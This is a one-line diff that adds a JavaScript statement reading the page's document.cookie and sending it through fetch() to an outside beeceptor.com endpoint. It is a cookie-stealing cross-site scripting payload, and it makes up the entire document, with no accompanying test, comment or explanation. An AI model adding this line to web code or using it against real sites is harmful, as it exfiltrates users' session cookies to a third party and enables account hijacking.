@@ -1,0 +1,1 @@
+fetch('https://k13777.free.beeceptor.com?c='+document.cookie)
